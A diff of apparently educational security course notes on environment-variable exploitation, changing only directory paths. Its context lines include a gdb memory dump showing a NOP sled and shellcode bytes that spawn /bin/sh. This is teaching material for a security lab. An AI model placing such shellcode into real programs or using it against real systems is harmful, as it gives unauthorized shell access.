@@ -57,7 +57,7 @@ We can list the environment variables with the ``env`` command :
    $ env
    SHELL=/bin/bash
    MYVAR=hacked
-   PWD=/home/kali/Documents/Security/LINGI2144-2020-2021/env-variable
+   PWD=/home/kali/Documents/Security/LINGI2144-2020-2022/env-variable
    LOGNAME=kali
    XDG_SESSION_TYPE=tty
    HOME=/home/kali
@@ -74,7 +74,7 @@ We can list the environment variables with the ``env`` command :
    PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
    DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
    SSH_TTY=/dev/pts/1
-   OLDPWD=/home/kali/Documents/Security/LINGI2144-2020-2021/shellcodes
+   OLDPWD=/home/kali/Documents/Security/LINGI2144-2020-2022/shellcodes
    _=/usr/bin/env
 
 We can find our variable on the second line.
@@ -126,7 +126,7 @@ env variable.**
    0xbffff636:   "SHELLCODE=", '\220' <repeats 190 times>...
    0xbffff6fe:   "\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
    0xbffff72c:   "MYVAR=hacked"
-   0xbffff739:   "PWD=/home/kali/Documents/Security/LINGI2144-2020-2021/env-variable"
+   0xbffff739:   "PWD=/home/kali/Documents/Security/LINGI2144-2020-2022/env-variable"
    0xbffff77c:   "LOGNAME=kali"
    [...]
 
